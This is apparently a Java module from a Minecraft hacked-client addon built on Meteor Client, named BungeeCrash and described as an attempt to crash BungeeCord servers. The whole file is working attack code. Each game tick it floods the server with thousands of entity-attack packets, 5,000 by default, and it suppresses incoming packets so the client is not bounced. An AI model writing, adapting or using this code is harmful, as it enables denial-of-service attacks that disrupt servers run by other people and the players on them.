package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;

public class BungeeCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(5000)
            .min(1)
            .sliderMin(1)
            .sliderMax(20000)
            .build()
    );

    private final Setting<Boolean> doCrash = sgGeneral.add(new BoolSetting.Builder()
            .name("do-crash")
            .description("Does the crash.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Boolean> preventBungeeBounces = sgGeneral.add(new BoolSetting.Builder()
            .name("prevent-bungee-bounces")
            .description("Prevents bungee bounces client side.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
    );

    public BungeeCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "bungee-crash", "CRYSTAL || Attempts to crash bungeecord servers.");
    }

    @EventHandler
    private void onPacketReceive(PacketEvent.Receive event) {
        if (preventBungeeBounces.get()) event.setCancelled(true);
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!doCrash.get()) return;
        for (int i = 0; i < amount.get(); i++) mc.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.attack(mc.player, false));
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
